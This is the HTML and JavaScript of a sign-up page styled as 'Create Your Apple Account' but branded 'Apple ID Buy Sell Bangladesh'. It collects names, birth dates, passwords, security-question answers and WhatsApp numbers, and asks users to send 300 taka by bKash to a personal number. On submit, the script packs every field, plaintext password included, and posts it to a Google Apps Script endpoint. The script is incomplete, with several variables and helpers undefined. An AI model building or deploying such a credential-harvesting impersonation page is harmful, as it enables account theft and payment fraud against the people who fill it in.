<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Create Your Apple Account</title>
  <meta name="color-scheme" content="dark light" />
  <style>
    /* (same CSS as you had) */
    :root{ --bg:#0f172a; --card:#111827; --muted:#94a3b8; --text:#e5e7eb; --accent:#60a5fa; --accent-2:#2563eb; --ok:#22c55e; --warn:#f59e0b; --err:#ef4444; --ring: color-mix(in hsl, var(--accent) 35%, transparent); --radius:16px; --shadow:0 8px 30px rgba(0,0,0,.35); --gap:16px; --pad: clamp(14px, 3vw, 24px); --container:960px; }
    @media (prefers-color-scheme: light){ :root{ --bg:#f8fafc; --card:#fff; --text:#111827; --muted:#475569; --ring: color-mix(in hsl, var(--accent-2) 25%, transparent); } }
    *,*::before,*::after{ box-sizing:border-box } html,body{ height:100% }
    body{ margin:0; font: 400 16px/1.55 ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial; color:var(--text); background: radial-gradient(1200px 800px at 70% -10%, #1f2937 0%, var(--bg) 50%, #0b1225 100%); display:grid; place-items:center; padding: max(env(safe-area-inset-top), 24px) 24px max(env(safe-area-inset-bottom), 24px); min-height: 100vh; }
    @supports (height: 100dvh){ body{ min-height: 100dvh; } }
    .container{ width:100%; max-width: var(--container); }
    .card{ background: linear-gradient(180deg, rgba(255,255,255,.04), rgba(255,255,255,.02)); border: 1px solid rgba(148,163,184,.2); border-radius: var(--radius); box-shadow: var(--shadow); padding: var(--pad); backdrop-filter: blur(8px); }
    h2{ margin:0 0 10px; font-size: clamp(22px, 3.5vw, 32px); letter-spacing:-.02em }
    .note{ font-size:13px; color:var(--muted); background: rgba(148,163,184,.08); border:1px dashed rgba(148,163,184,.25); border-radius:12px; padding:10px 12px; margin-bottom:12px; }
    form{ display:grid; gap: var(--gap) } fieldset{ border:0; margin:0; padding:0 } .visually-hidden{ position:absolute!important; clip:rect(1px,1px,1px,1px); padding:0; border:0; height:1px; width:1px; overflow:hidden; white-space:nowrap }
    .row{ display:grid; gap:12px; grid-template-columns: 1fr 1fr; }
    @media (max-width: 720px){ .row{ grid-template-columns: 1fr; } }
    .field{ position:relative } label{ font-size:14px; color:var(--muted); display:block; margin-bottom:6px }
    .small-checkbox{ display:flex; align-items:center; gap:8px; margin-bottom:6px }
    input,select,button,textarea{ font:inherit }
    input,select,textarea{ width:100%; padding:12px 14px; border-radius:12px; background:#0b1020; color:var(--text); border:1px solid color-mix(in hsl, var(--muted) 30%, transparent); outline:none; transition: border-color .15s ease, box-shadow .15s ease; }
    @media (prefers-color-scheme: light){ input,select,textarea{ background:#fff; color:var(--text); } }
    input:focus,select:focus,textarea:focus{ border-color: var(--accent); box-shadow: 0 0 0 4px var(--ring) }
    input[aria-invalid="true"]{ border-color: var(--err); box-shadow:0 0 0 4px color-mix(in hsl, var(--err) 25%, transparent) }
    .locked{ background: linear-gradient(180deg, #0b1020, #0b0f1a); opacity: .85; cursor: not-allowed; }
    .hint{ font-size:12px; color:var(--muted); margin-top:6px } .error{ font-size:12px; color:var(--err); margin-top:6px; min-height:1em }
    .actions{ display:flex; gap:10px; flex-wrap:wrap; align-items:center } button{ appearance:none; border:0; padding:12px 16px; border-radius:12px; font-weight:600; cursor:pointer; background: linear-gradient(180deg, var(--accent), var(--accent-2)); color:#fff; box-shadow: 0 6px 16px rgba(37,99,235,.5); touch-action: manipulation; }
    .ghost{ background:transparent; border:1px solid rgba(148,163,184,.35); color:var(--text); box-shadow:none } .status{ font-size:13px } .status.ok{ color:var(--ok) } .status.warn{ color:var(--warn) } .status.err{ color:var(--err) }
    .icon-btn{ position:absolute; right:10px; top:36px; background:transparent; border:0; padding:2px 4px; cursor:pointer; line-height:1; }
    dialog{ border:0; border-radius:12px; padding: var(--pad); max-width: min(92vw, 420px); box-shadow: var(--shadow); }
    .divider{ height:1px; background: rgba(148,163,184,.2); margin: 6px 0 }
  </style>
</head>
<body>
  <main class="container" role="main">
    <section class="card" aria-labelledby="formTitle">
      <h2 id="formTitle">Create Your Apple Account</h2>
      <p class="note" id="demoNote">APPLE ID BUY SELL BANGLADESH</p>

      <form id="signupForm" novalidate method="post" autocomplete="on" aria-describedby="demoNote">
        <!-- Personal info -->
        <fieldset aria-describedby="nameHelp">
          <legend class="visually-hidden">Personal Information</legend>
          <div id="nameHelp" class="visually-hidden">Enter your first and last name.</div>
          <div class="row">
            <div class="field">
              <label for="firstName">First Name</label>
              <input id="firstName" name="given-name" type="text" placeholder="e.g., Ariyan" autocomplete="given-name" required autocapitalize="words" />
              <div class="error" id="err-firstName" aria-live="polite"></div>
            </div>
            <div class="field">
              <label for="lastName">Last Name</label>
              <input id="lastName" name="family-name" type="text" placeholder="e.g., Hossain" autocomplete="family-name" required autocapitalize="words" />
              <div class="error" id="err-lastName" aria-live="polite"></div>
            </div>
          </div>
        </fieldset>

        <!-- Region & DOB -->
        <fieldset>
          <legend class="visually-hidden">Region & Date of Birth</legend>
          <div class="row">
            <div class="field">
              <label for="country">Country/Region</label>
              <select id="country" name="country" autocomplete="country" required>
               
               
                <option value="US">United States</option>
                <option value="GB">United Kingdom</option>
                <option value="CA">Canada</option>
                <option value="AU">Australia</option>
              </select>
              <div class="error" id="err-country" aria-live="polite"></div>
            </div>
            <div class="field">
              <label for="dob">Date of Birth</label>
              <input id="dob" name="bday" type="date" required />
              <p class="hint" id="ageHint">You must be at least 13 years old.</p>
              <div class="error" id="err-dob" aria-live="polite"></div>
            </div>
          </div>
        </fieldset>

        <!-- Contact -->
        <fieldset>
          <legend class="visually-hidden">Contact</legend>
          <div class="row">
            <!-- Email block -->
            <div class="field" id="emailBlock">
              <div class="small-checkbox">
                <input id="useRandomEmail" type="checkbox" />
                <label for="useRandomEmail" style="color:var(--muted)"></label>
              </div>
              <label for="email">Email (Enter Your new gmail)</label>
              <input id="email" name="email" type="email" placeholder="name@example.com" autocomplete="email" inputmode="email" required autocapitalize="off" spellcheck="false" />
              <div class="error" id="err-email" aria-live="polite"></div>
            </div>

            <!-- Phone block -->
            <div class="field" id="phoneBlock">
              <div class="small-checkbox">
                <input id="skipPhone" type="checkbox" />
                <label for="skipPhone" style="color:var(--muted)"></label>
              </div>
              <label for="phone">Mobile Number</label>
              <input id="phone" name="tel" type="tel" inputmode="tel"
                     placeholder="NUmber or +8801XXXXXXXXX"
                     pattern="^(?:\+?8801\d{9}|01\d{9})$"
                     title="Bangladesh format: 01XXXXXXXXX or +8801XXXXXXXXX"
                     maxlength="14"
                     autocomplete="tel-national" aria-describedby="phoneHint" />
              <p class="hint" id="phoneHint">Bangladeshi format: 01XXXXXXXXX (11 digits). International also allowed: +8801XXXXXXXXX.</p>
              <div class="error" id="err-phone" aria-live="polite"></div>
            </div>
          </div>
        </fieldset>

        <!-- Password -->
        <fieldset>
          <legend class="visually-hidden">Password</legend>
          <div class="row">
            <div class="field">
              <label for="password">Password</label>
              <input id="password" name="new-password" type="password" minlength="8" placeholder="At least 8 characters" required aria-describedby="pwdHint pwLabel" autocomplete="new-password" spellcheck="false" />
              <button type="button" class="icon-btn" id="togglePw" aria-label="Show/hide password">üëÅÔ∏è</button>
              <p id="pwdHint" class="hint">Minimum 8 characters, including uppercase, lowercase, number, and special character.</p>
              <meter id="pwMeter" min="0" max="4" low="2" high="3" optimum="4" value="0" style="width:100%"></meter>
              <output id="pwLabel" class="hint" aria-live="polite"></output>
              <div class="error" id="err-password" aria-live="polite"></div>
            </div>
            <div class="field">
              <label for="confirm">Confirm Password</label>
              <input id="confirm" name="confirm-password" type="password" required autocomplete="new-password" spellcheck="false" />
              <button type="button" class="icon-btn" id="toggleCpw" aria-label="Show/hide confirm password">üëÅÔ∏è</button>
              <div class="error" id="err-confirm" aria-live="polite"></div>
            </div>
          </div>
        </fieldset>

        <!-- Security (demo) -->
        <fieldset>
          <legend>Security Questions</legend>
          <div class="row">
            <div class="field">
              <label for="securityQuestion1">Security Question 1</label>
              <select id="securityQuestion1" name="securityQuestion1" required>
                <option value="">‚Äî Select ‚Äî</option>
                <option>What was the name of your best friend as a teenager?</option>
                <option>What was the name of your first pet?</option>
                <option>What was the first dish you learnt to cook?</option>
              </select>
            </div>
            <div class="field">
              <label for="securityAnswer1">Answer</label>
              <input id="securityAnswer1" name="securityAnswer1" type="text" required autocomplete="off" />
            </div>
          </div>
          <div class="row">
            <div class="field">
              <label for="securityQuestion2">Security Question 2</label>
              <select id="securityQuestion2" name="securityQuestion2" required>
                <option value="">‚Äî Select ‚Äî</option>
                <option>What is your dream job?</option>
                <option>What is your favourite children's book?</option>
                <option>What was the model of your first motorised vehicle?</option>
              </select>
            </div>
            <div class="field">
              <label for="securityAnswer2">Answer</label>
              <input id="securityAnswer2" name="securityAnswer2" type="text" required autocomplete="off" />
            </div>
          </div>
          <div class="row">
            <div class="field">
              <label for="securityQuestion3">Security Question 3</label>
              <select id="securityQuestion3" name="securityQuestion3" required>
                <option value="">‚Äî Select ‚Äî</option>
                <option>In what city did your parents meet?</option>
                <option>What was the name of your first manager?</option>
                <option>What is the name of the street where you grew up?</option>
              </select>
            </div>
            <div class="field">
              <label for="securityAnswer3">Answer</label>
              <input id="securityAnswer3" name="securityAnswer3" type="text" required autocomplete="off" />
            </div>
          </div>
          <p class="hint">Note: In real apps, prefer 2FA/Passkeys instead of security questions.</p>
        </fieldset>

        <div class="divider" role="separator" aria-hidden="true"></div>

        <!-- WhatsApp (Bangla) -->
        <fieldset lang="bn">
          <legend>WhatsApp ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¶‡ßá‡¶ì‡¶Ø‡¶º‡¶æ Gmail-‡¶è ‡¶è‡¶ï‡¶ü‡¶ø ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶ø‡¶ï‡ßá‡¶∂‡¶® ‡¶ï‡ßã‡¶° ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡¶¨‡ßá‡•§ ‡¶Ö‡¶®‡ßÅ‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßá ‡¶∏‡ßá‡¶á ‡¶ï‡ßã‡¶°‡¶ü‡¶ø WhatsApp-‡¶è ‡¶¶‡¶ø‡¶§‡ßá ‡¶π‡¶¨‡ßá‡•§</legend>
          <div class="field">
            <label for="whatsapp">WhatsApp ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞</label>
            <input id="whatsapp" name="whatsapp" type="tel" inputmode="tel"
                   placeholder="WhatsApp Number, +8801XXXXXXXXX"
                   pattern="^(?:\+?8801\d{9}|01\d{9})$"
                   title="‡¶¨‡¶æ‡¶Ç‡¶≤‡¶æ‡¶¶‡ßá‡¶∂‡¶ø ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü: 01XXXXXXXXX ‡¶¨‡¶æ +8801XXXXXXXXX"
                   autocomplete="tel" aria-describedby="whatsappHint" />
            <p class="hint" id="whatsappHint">
              
            </p>
            <div class="error" id="err-whatsapp" aria-live="polite"></div>
          </div>
        </fieldset>

        <!-- TRX (Bangla) -->
        <fieldset lang="bn">
          <legend>Payment (Send Money) ‚Äì bKash Personal</legend>
          <div class="field">
            <label for="trxId">TRX ID</label>
            <input id="trxId" name="trxId" type="text" inputmode="text"
                   placeholder="Transaction ID"
                   pattern="^[A-Za-z0-9]{8,20}$" title="‡ßÆ‚Äì‡ß®‡ß¶‡¶ü‡¶ø ‡¶á‡¶Ç‡¶∞‡ßá‡¶ú‡¶ø ‡¶Ö‡¶ï‡ßç‡¶∑‡¶∞ ‡¶¨‡¶æ ‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ"
                   aria-describedby="trxHint" />
            <p class="hint" id="trxHint">
              ‚ö†Ô∏è ‡ß©‡ß¶‡ß¶ ‡¶ü‡¶æ‡¶ï‡¶æ 01630249778 ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞‡ßá send money ‡¶ï‡¶∞‡ßá TRX ID ‡¶ú‡¶Æ‡¶æ ‡¶¶‡¶ø‡¶®‡•§ ‡ßß‡ß¶ ‡¶Æ‡¶ø‡¶®‡¶ø‡¶ü‡ßá‡¶∞ ‡¶Æ‡¶ß‡ßç‡¶Ø‡ßá WhatsApp-‡¶è ‡¶Ø‡ßã‡¶ó‡¶æ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡¶æ ‡¶π‡¶¨‡ßá‡•§
            </p>
            <div class="error" id="err-trxId" aria-live="polite"></div>
          </div>
        </fieldset>

        <div class="tos" style="display:grid;grid-template-columns:20px 1fr;gap:10px;align-items:start">
          <input id="agree" type="checkbox" required />
          <label for="agree">I agree to the Terms & Privacy Policy.</label>
        </div>

        <div class="actions">
          <button type="submit" aria-label="Create account">Create Account</button>
          <button type="reset" class="ghost" id="resetBtn">Reset</button>
          <span id="formStatus" class="status" role="status" aria-live="polite" aria-atomic="true"></span>
        </div>

        <!-- Plain text preview area (shown after submit) -->
        <section id="plainWrap" style="margin-top:12px;display:none">
          <label for="plainOut" style="font-size:14px;color:var(--muted);display:block;margin-bottom:6px">
            Apple ID Buy Sell BD
          </label>
          <textarea id="plainOut" rows="10" readonly
                    style="width:100%;padding:12px 14px;border-radius:12px;border:1px solid rgba(148,163,184,.35);
                           background:#0b1020;color:var(--text);"></textarea>
        </section>
      </form>

      <footer style="text-align:center;color:var(--muted);font-size:12px;margin-top:10px">
        ¬© Apple ID Buy Sell Bangladesh.
      </footer>

      <noscript>
        <p class="note">JavaScript is disabled ‚Äî the form will submit with basic browser validation.</p>
      </noscript>
    </section>
  </main>

  <dialog id="successDialog" inert>
    <p>‚úÖ submitted successfully! Please wait while we process your request</p>
    <form method="dialog"><button>OK</button></form>
  </dialog>

<script>
  // (keep your helper $ etc.)

  // small improvements / safety guards
  function genRandomEmail(){
    const ts = Date.now().toString(36);
    const rnd = Math.floor(Math.random()*90000)+10000;
    // use a placeholder domain you control or a clearly fake one for demo:
    return `user-${ts}-${rnd}@example.com`;
  }

  async function sendPayloadToAppsScript(textPayload){
    try {
      const res = await fetch(APPS_SCRIPT_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          textPayload: textPayload,
          filename: `signup-${Date.now()}.txt`,
          token: TOKEN
        })
      });
      const j = await res.json().catch(()=>null);
      if (j?.ok) {
        showStatus('üì§ Sent to your email via Apps Script.', 'ok');
      } else if (j?.error) {
        showStatus('‚ö†Ô∏è Apps Script: ' + j.error, 'warn');
      } else {
        showStatus('‚ö†Ô∏è Apps Script responded unexpectedly.', 'warn');
      }
    } catch (err) {
      console.error('Apps Script send error', err);
      showStatus('‚ùå Could not reach Apps Script (network/CORS issue).', 'err');
    }
  }

  // helper to detect touch devices (simple)
  const isTouch = ('ontouchstart' in window) || navigator.maxTouchPoints > 0;

  // wrap download so mobile doesn't try to auto-download and get blocked
  function tryDownloadText(filename, text){
    try {
      if (isTouch){
        // skip auto-download on touch devices to avoid being blocked
        console.log('skipping auto-download on touch device');
        return;
      }
      const blob = new Blob([text], {type: 'text/plain'});
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url; a.download = filename;
      document.body.appendChild(a);
      a.click();
      a.remove(); URL.revokeObjectURL(url);
    } catch (err) {
      console.error('downloadText error', err);
    }
  }

  // safe dialog show helper
  function safeShowDialog(d){
    try {
      if (!d) return;
      if (typeof d.showModal === 'function') {
        d.removeAttribute('inert');
        d.showModal();
      } else if (typeof d.show === 'function') {
        d.removeAttribute('inert');
        d.show();
      } else {
        // fallback alert for older browsers
        alert('‚úÖ submitted successfully! Please wait while we process your request');
      }
    } catch (err) {
      console.error('dialog show error', err);
      try { alert('‚úÖ submitted successfully!'); } catch(e){ /* ignore */ }
    }
  }

  // submit handler with try/catch
  form.addEventListener('submit', (e)=>{
    e.preventDefault();
    try {
      if (!form.checkValidity()){
        showStatus('‚ö†Ô∏è Please fill out required fields correctly.', 'warn');
        // prefer reportValidity to show messages (some mobile browsers behave better)
        if (typeof form.reportValidity === 'function') form.reportValidity();
        return;
      }

      if (!passwordStrong(pw.value)){
        setFieldValidity(pw, false, 'Password does not meet the rules.');
        showStatus('Password does not meet the rules.', 'err');
        pw.focus(); return;
      }
      const match = pw.value === cpw.value;
      setFieldValidity(cpw, match, match ? '' : 'Passwords do not match.');
      if (!match){ showStatus('Passwords do not match.', 'err'); cpw.focus(); return; }

      const ageOk = ageOK(dobInput.value);
      setFieldValidity(dobInput, ageOk, ageOk ? '' : 'You must be at least 13 years old.');
      if (!ageOk){ showStatus('You must be at least 13 years old.', 'err'); dobInput.focus(); return; }

      // Phone validation
      if (phone && phone.value && !phone.readOnly){
        const ok = new RegExp(phone.getAttribute('pattern')).test(phone.value);
        setFieldValidity(phone, ok, ok ? '' : 'Phone format is invalid.');
        if (!ok){ showStatus('Phone format is invalid.', 'err'); phone.focus(); return; }
      }

      // WhatsApp validation
      if (whatsapp && whatsapp.value.trim()){
        const ok = new RegExp(whatsapp.getAttribute('pattern')).test(whatsapp.value.trim());
        setFieldValidity(whatsapp, ok, ok ? '' : 'WhatsApp ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞‡ßá‡¶∞ ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü ‡¶†‡¶ø‡¶ï ‡¶®‡ßá‡¶á‡•§');
        if (!ok){ showStatus('WhatsApp ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞‡ßá‡¶∞ ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü ‡¶†‡¶ø‡¶ï ‡¶®‡ßá‡¶á‡•§', 'err'); whatsapp.focus(); return; }
      }

      // TRX validation
      if (trxId && trxId.value.trim()){
        const ok = new RegExp(trxId.getAttribute('pattern')).test(trxId.value.trim());
        setFieldValidity(trxId, ok, ok ? '' : 'TRX ID ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü ‡¶∏‡¶†‡¶ø‡¶ï ‡¶®‡¶Ø‡¶º (8‚Äì20 ‡¶Ö‡¶ï‡ßç‡¶∑‡¶∞/‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ)‡•§');
        if (!ok){ showStatus('TRX ID ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü ‡¶∏‡¶†‡¶ø‡¶ï ‡¶®‡¶Ø‡¶º‡•§', 'err'); trxId.focus(); return; }
      }

      showStatus('‚úÖ submitted successfully! Processing‚Ä¶', 'ok');

      // Build plain text + show in UI
      const textPayload = buildPlainTextPayload(form);
      const outEl = document.getElementById('plainOut');
      const wrapEl = document.getElementById('plainWrap');
      if (outEl && wrapEl){ outEl.value = textPayload; wrapEl.style.display = 'block'; }

      // try download but skip on touch devices
      tryDownloadText('signup-demo.txt', textPayload);

      // send to Apps Script (if configured)
      if (APPS_SCRIPT_URL && APPS_SCRIPT_URL.includes('script.google.com')) {
        sendPayloadToAppsScript(textPayload);
      } else {
        showStatus('‚ö†Ô∏è Apps Script URL not configured.', 'warn');
      }

      // show dialog safely
      safeShowDialog(dlg);

    } catch (err) {
      console.error('submit handler error', err);
      showStatus('‚ùå An unexpected error occurred. See console.', 'err');
      // as fallback show an alert for mobile users
      try { alert('An unexpected error occurred. Please try again.'); } catch(e){}
    }
  });

  // other handlers unchanged...
</script>

</body>
</html>
